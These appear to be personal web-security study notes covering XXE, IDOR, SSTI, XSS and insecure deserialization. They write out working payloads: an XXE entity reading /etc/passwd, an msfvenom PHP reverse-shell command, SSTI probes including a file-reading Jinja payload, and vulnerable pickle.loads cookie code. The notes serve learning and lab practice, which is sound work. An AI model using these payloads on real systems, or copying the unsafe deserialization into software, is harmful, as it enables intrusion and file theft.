# XML

DTD = Document Type Definition
defines structure of the legal elements and attributes of the xml document.

`<!DOCTYPE note [ <!ELEMENT note (to,from,heading,body)> <!ELEMENT to (#PCDATA)> <!ELEMENT from (#PCDATA)> <!ELEMENT heading (#PCDATA)> <!ELEMENT body (#PCDATA)> ]>`

!DOCTYPE note - Defines a root element of the document named note
!ELEMENT note - Defines that the note element must contain the elements: "to, from, heading, body"
!ELEMENT to - Defines the to element to be of type "#PCDATA"
!ELEMENT from - Defines the from element to be of type "#PCDATA"
!ELEMENT heading - Defines the heading element to be of type "#PCDATA"
!ELEMENT body - Defines the body element to be of type "#PCDATA"

Define new element = !ELEMENT
Define root element = !DOCTYPE
Define new entity = !ENTITY

## XXE payloads

```xml
<!DOCTYPE replace [<!ENTITY name "feast"> ]>
 <userInfo>
  <firstName>falcon</firstName>
  <lastName>&name;</lastName>
 </userInfo>
```

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```

# IDOR

Change url parameters

# Security misconfiguration

Default passwords
PUT header

Cadaver is a command line tool pre-installed in the Kali machine that enables the uploading and downloading of a file on WebDAV.

`msfvenom -p php/reverse_php LHOST=127.0.0.1 LPORT=1234 -o shell.php`

## Input santitisation bad practices

POST form example:
`name=admin`

Possible exploits:

```
name=${7*7}
name=#{7*7}
name=*{7*7}
name={{7*7}}
name=${{7*7}}
name=#{{7*7}}
name=*{{7*7}}
name={${7*7}}
name={#{7*7}}
name={*{7*7}}
name={{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}}

```

## Enumerate

app environment, sensitive information about the database connections, secret keys, credentials, running services, etc.

# SSTI

## SSTI payload generator https://github.com/VikasVarshney/ssti-payload

# XSS

Alert message
Show machines ip = <script>alert(window.location.hostname)</script>

connect.sid=s%3AVH4forvvtp1tMOdcIMBXJZJyUDlLZf4E.%2FXy6MyKV1WcGXkdxm%2BDK96hsfafeFelJp0wAGVp%2FsZc

## Reflected xss

1. Attacker sends a link to victim that contains the payload
2. Victim clicks the link and taken to the site
3. Link executes script on victims machine
4. Attacker steals the cookie of the user (containing passwords or session cookies that can be used)

## Stored xss

1. Attacker inserts a malicious payload into the sites database
2. Everyone visiting the site will be affected
3. Cookies are sent to the attacker

## DOM based xss

1. Attacker inserts html into the site containing the malicious payload

## Blind xss

1. Same as stored xss but you cant see the payload working or test it against yourself first

# Deserialization

serialization = Converting objects into simpler, compatible formatting for transmitting between systems or networks for further processing or storage.

Deserialization = Opposite of serialization

Base-2 = Binary

## Cookies

Stored on the users computer
Cookie name
Cookie Value
Secure only: If set, this cookie will only be set over HTTPS connections
Expiry: Timestamp when the cookie expires
Path: The cookie will only be sent if the specified URL is within the request

Creating cookies in flask:

```python
dateTime = datetime.now()
timestamp = str(dateTime)
resp.set_cookie("registrationTimestamp", timestamp)
```

Vulnerable form example: Python

```python
def two():
    cookie = request.cookies.get("encodedPayload")
    cookie = pickle.loads(base64.b64decode(cookie))

def one():
    cookie = { "replaceme": payload}
    pickle_payload = pickle.dumps(cookie)
    encodedPayloadCookie = base64.b64encode(pickle_payload)
    resp = make_response(redirect('/myprofile'))
    resp.set_cookie('encodedPayload', encodedPayloadCookie)
```
